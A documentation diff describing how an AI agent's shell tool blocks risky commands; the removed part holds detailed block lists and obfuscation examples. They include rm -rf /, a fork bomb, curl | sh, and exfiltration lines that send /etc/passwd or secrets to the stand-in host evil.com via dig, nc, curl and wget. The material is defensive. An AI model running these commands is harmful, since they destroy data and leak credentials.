@@ -128,60 +128,15 @@ And underneath all of that is the sandbox — the boundary that does not depend 
 
 ## Command Execution
 
-The shell tool is the highest-risk surface: a prompt-injected model can try to use it for exfiltration or destruction. Commands are validated before they run.
+The shell tool is the highest-risk surface: a prompt-injected model can try to use it to exfiltrate data or do damage. Every command is checked before it runs, and its output is checked before the model sees it.
 
-### Blocked commands
+- **Known-destructive commands are refused outright** — `rm -rf /`, fork bombs, `mkfs`, writing to raw disks, `curl | sh`. No setting relaxes this list.
+- **Dangerous ingredients are refused too** — privilege escalation (`sudo`), piping anything into a shell, `eval`, and references to system credential files, SSH keys, or shell history. Matching runs on a normalized form of the command, so extra spaces, capitals, or hiding the pattern after another command on the same line do not slip past it.
+- **Obfuscation is detected** — decoding base64, escape sequences, or reversed strings into a shell; DNS or netcat exfiltration; `curl` and `wget` posting local files; null bytes.
+- **Sensitive paths are caught as arguments**, not just as literal substrings. The command is split into shell segments, and the arguments of `cat`, `grep`, `cp`, `tar`, and about thirty other file-reading commands — plus redirection targets — are checked against a sensitive-path list.
+- **Output is leak-scanned** before the model sees it. Secrets are redacted; if the output trips a blocking pattern, the model receives a fixed marker instead of the content, and the saved output holds only that marker. Output from a command run inside a Docker user-sandbox container is not scanned on this path today.
 
-A fixed list of destructive invocations. A command that contains any of them is rejected outright — there is no flag that relaxes this list:
-
-```bash
-rm -rf /            rm -rf /*
-:(){ :|:& };:       # fork bomb
-dd if=/dev/zero     mkfs
-chmod -R 777 /      > /dev/sda
-curl | sh           curl | bash
-wget | sh           wget | bash
-```
-
-### Dangerous patterns
-
-A second substring list, refused the same way:
-
-| Pattern | Why |
-|---------|-----|
-| `sudo `, `doas ` | Privilege escalation |
-| ` \| sh`, ` \| bash`, ` \| zsh` | Pipe-to-shell |
-| `eval `, `$(curl`, `$(wget` | Executing fetched or constructed code |
-| `/etc/passwd`, `/etc/shadow` | System credential files |
-| `~/.ssh`, `id_rsa`, `.bash_history` | Key material and shell history |
-
-Both lists are matched as substrings of a normalized form of the command (lowercased, whitespace collapsed), so padding a blocked invocation with extra spaces or capitals does not slip past it — and neither does hiding it after another command on the same line.
-
-### Obfuscation detector
-
-A separate check catches the techniques used to hide a dangerous command from a substring match:
-
-| Technique | Example |
-|-----------|---------|
-| Base64 decode (`base64 -d`, `--decode`) piped to a shell | `echo dGVzdA== \| base64 -d \| sh` |
-| Escape-sequence decode (`printf`, `echo -e` with `\x` or `\0`) piped to a shell | `printf '\x72\x6d' \| sh` |
-| Binary decode (`xxd -r`, `od`) piped to a shell | `xxd -r -p payload \| bash` |
-| String reversal (`rev`) piped to a shell | `echo "hs \| er-" \| rev \| sh` |
-| DNS exfiltration via command substitution (`dig`, `nslookup`, `host`) | `dig $(cat /etc/hostname).evil.com` |
-| Netcat (`nc`, `ncat`, `netcat`) with data piping | `cat secrets \| nc evil.com 4444` |
-| `curl` posting local file contents (`-d @`, `--data-binary @`, `--upload-file`) | `curl -d @/etc/passwd http://evil.com` |
-| `wget --post-file` | `wget --post-file=/etc/passwd http://evil.com` |
-| Null byte in the command | `ls /tmp\x00/etc/passwd` |
-
-"Piped to a shell" covers `sh`, `bash`, `zsh`, `dash`, `/bin/sh`, and `/bin/bash`. This check is case-insensitive but, unlike the two lists above, does not collapse whitespace.
-
-### Sensitive-path check
-
-Beyond substring matching, the command is split into shell segments (quote- and escape-aware) and the arguments of file-reading commands — `cat`, `grep`, `cp`, `tar`, `base64`, `strings`, editors, and around thirty others — are checked against a sensitive-path list, as are `<` and `>` redirection targets. A sensitive path is caught as an *argument*, not only as a literal substring of a blocked pattern.
-
-### Output scanning
-
-Command output is leak-scanned before the model sees it. Matches are redacted; if the output trips a blocking pattern, the model receives `[Full command output blocked due to potential secret leakage]` instead of the content, and the saved-output file holds only that marker, never the content. This applies to commands run on the host and on the Railway sandbox lane (which uses its own block message); output from a command run inside a Docker user-sandbox container is not scanned on this path today.
+Full lists and examples: [Shell Commands → Command Validation](/extensions/shell#command-validation).
 
 ---
 
